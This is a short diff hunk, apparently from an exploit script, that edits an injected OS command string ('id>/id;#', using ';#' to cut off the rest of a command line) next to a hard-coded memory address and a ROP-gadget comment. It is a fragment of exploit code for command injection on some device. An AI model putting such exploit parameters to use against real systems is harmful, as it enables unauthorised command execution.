@@ -9,7 +9,7 @@ ast = ast
 
 # OS command
 md5_sum_len = 32
-cmd         = "id > /id;#"
+cmd         = "id>/id;#"
 cmd_ptr     = 0xbeffc104+396
 
 # Preconditions gadget 0
